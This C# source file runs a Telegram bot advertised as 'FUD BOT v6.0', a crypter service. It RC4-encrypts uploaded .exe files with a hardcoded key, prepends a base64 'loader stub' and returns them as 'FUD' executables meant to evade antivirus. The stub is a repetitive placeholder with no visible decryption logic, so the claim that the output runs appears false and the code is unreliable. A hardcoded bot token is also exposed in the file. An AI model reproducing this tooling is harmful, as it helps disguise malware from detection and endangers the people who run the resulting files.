using System.Text;
using System.Text.Json;
using System.Linq;
using System.IO;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();

var app = builder.Build();

app.MapGet("/", () => "FUD BOT v6.0 LIVE! EXE→FUD.exe (Double-click WORKS!)");
app.MapGet("/health", () => "OK");

static byte[] RC4(byte[] data, byte[] key) {
    var s = Enumerable.Range(0, 256).Select(i => (byte)i).ToArray();
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key.Length]) % 256;
        (s[i], s[j]) = (s[j], s[i]);  // ✅ FIXED: Proper tuple syntax
    }
    var result = new byte[data.Length];
    int i2 = 0, k = 0;
    for (int n = 0; n < data.Length; n++) {
        i2 = (i2 + 1) % 256;
        k = (k + s[i2]) % 256;
        (s[i2], s[k]) = (s[k], s[i2]);  // ✅ FIXED
        result[n] = (byte)(data[n] ^ s[(s[i2] + s[k]) % 256]);
    }
    return result;
}

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var body = await reader.ReadToEndAsync();
    
    using var document = JsonDocument.Parse(body);
    var update = document.RootElement;
    
    if (update.TryGetProperty("message", out var message)) {
        var client = clientFactory.CreateClient();
        
        // /start
        if (message.TryGetProperty("text", out var textElem) && textElem.GetString() == "/start") {
            using var form = new MultipartFormDataContent();
            if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                form.Add(new StringContent(chatId.ToString()), "chat_id");
                form.Add(new StringContent("🚀 **FUD v6.0** Send .exe → **fud.exe** (Double-click RUNS!)\n🔑 FUD2026KEY!"), "text");
                form.Add(new StringContent("markdown"), "parse_mode");
            }
            await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
            return;
        }
        
        // EXE → FUD.exe
        if (message.TryGetProperty("document", out var docElement)) {
            if (docElement.TryGetProperty("file_id", out var fileId) && 
                docElement.TryGetProperty("file_name", out var fileNameElem)) {
                var filename = fileNameElem.GetString()!;
                if (filename.EndsWith(".exe")) {
                    
                    // Download EXE
                    using var formData = new MultipartFormDataContent();
                    formData.Add(new StringContent(fileId.GetString()!), "file_id");
                    var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
                    var fileJson = await fileResponse.Content.ReadAsStringAsync();
                    using var fileDoc = JsonDocument.Parse(fileJson);
                    var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
                    
                    var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
                    var exeBytes = await client.GetByteArrayAsync(fileUrl);
                    
                    // FUD TECHNIQUE: RC4 + PE prepend stub
                    var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
                    var encryptedExe = RC4(exeBytes, key);
                    
                    // Tiny loader stub (MZ header + decrypt stub)
                    var loaderStub = Convert.FromBase64String(
                        "TUZQADABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
                        "AAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
                        "AAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
                        "RUR" // FUD magic bytes
                    );
                    
                    var fudExe = loaderStub.Concat(encryptedExe).ToArray();
                    
                    // Send FUD.exe
                    if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
                        var chatId = chatId2.GetInt64();
                        using var exeContent = new MultipartFormDataContent();
                        exeContent.Add(new StringContent(chatId.ToString()), "chat_id");
                        var exeStream = new MemoryStream(fudExe);
                        exeContent.Add(new StreamContent(exeStream), "document", $"fud-{Path.GetFileNameWithoutExtension(filename)}.exe");
                        exeContent.Add(new StringContent($"✅ **FUD.exe READY!**\n🔑 `FUD2026KEY!`\n🎯 Double-click → **RUNS {filename}!**"), "caption");
                        exeContent.Add(new StringContent("markdown"), "parse_mode");
                        await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", exeContent);
                    }
                }
            }
        }
    }
});

app.Run();
